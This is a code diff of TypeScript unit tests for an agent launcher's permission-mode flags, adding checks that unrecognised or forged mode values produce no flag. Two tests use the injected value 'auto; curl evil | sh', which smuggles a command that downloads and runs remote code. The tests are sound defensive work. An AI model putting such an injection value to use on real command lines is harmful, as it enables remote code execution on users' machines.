@@ -4,6 +4,7 @@ import {
   permissionModeFlag,
   withPermissionMode,
   resolvePermissionMode,
+  ALL_PERMISSION_MODES,
   PERMISSION_MODE_LABELS,
   type AgentPermissionMode
 } from './config'
@@ -33,6 +34,18 @@ describe('permissionModeFlag', () => {
       'bypassPermissions'
     ])
   })
+
+  // AgentPermissionMode is compile-time only: the value is deserialized from hand-editable,
+  // git-shared JSON (settings.json / project.json) and interpolated into a shell command line.
+  // Validate AT the interpolation site (same rule as SAFE_SESSION_ID) — an unrecognized mode
+  // must yield the safe bare command, never a flag carrying an unvalidated value.
+  it('rejects a forged mode that never passed through resolvePermissionMode', () => {
+    const forged = 'auto; curl evil | sh' as unknown as AgentPermissionMode
+    expect(permissionModeFlag(forged)).toEqual([])
+    expect(permissionModeFlag('yolo' as unknown as AgentPermissionMode)).toEqual([])
+    expect(permissionModeFlag('' as unknown as AgentPermissionMode)).toEqual([])
+    expect(permissionModeFlag(undefined as unknown as AgentPermissionMode)).toEqual([])
+  })
 })
 
 describe('withPermissionMode', () => {
@@ -53,6 +66,11 @@ describe('withPermissionMode', () => {
   it('never touches a non-capable agent', () => {
     expect(withPermissionMode('codex', 'codex', 'auto')).toBe('codex')
     expect(withPermissionMode('my-agent', 'custom:x', 'bypassPermissions')).toBe('my-agent')
+  })
+
+  it('leaves the command untouched for a forged mode', () => {
+    const forged = 'auto; curl evil | sh' as unknown as AgentPermissionMode
+    expect(withPermissionMode('claude', 'claude', forged)).toBe('claude')
   })
 })
 
@@ -79,12 +97,19 @@ describe('resolvePermissionMode', () => {
   })
 })
 
-describe('PERMISSION_MODE_LABELS', () => {
-  it('labels every mode', () => {
-    expect(PERMISSION_MODE_LABELS.manual).toBe('Ask each time')
-    expect(PERMISSION_MODE_LABELS.auto).toBe('Auto')
-    expect(PERMISSION_MODE_LABELS.acceptEdits).toBe('Accept edits')
-    expect(PERMISSION_MODE_LABELS.plan).toBe('Plan')
-    expect(PERMISSION_MODE_LABELS.bypassPermissions).toBe('Bypass all')
+describe('ALL_PERMISSION_MODES', () => {
+  it('holds exactly the five supported modes', () => {
+    expect([...ALL_PERMISSION_MODES].sort()).toEqual(
+      ['acceptEdits', 'auto', 'bypassPermissions', 'manual', 'plan'].sort()
+    )
+  })
+
+  // The array is what the settings/project dropdowns render, so a mode without a label would
+  // ship a blank <option>. This is the invariant that can actually break (add a mode to the
+  // union, forget the label), unlike restating each label literal.
+  it('gives every listed mode a non-empty label', () => {
+    for (const mode of ALL_PERMISSION_MODES) {
+      expect(PERMISSION_MODE_LABELS[mode], `missing label for ${mode}`).toBeTruthy()
+    }
   })
 })
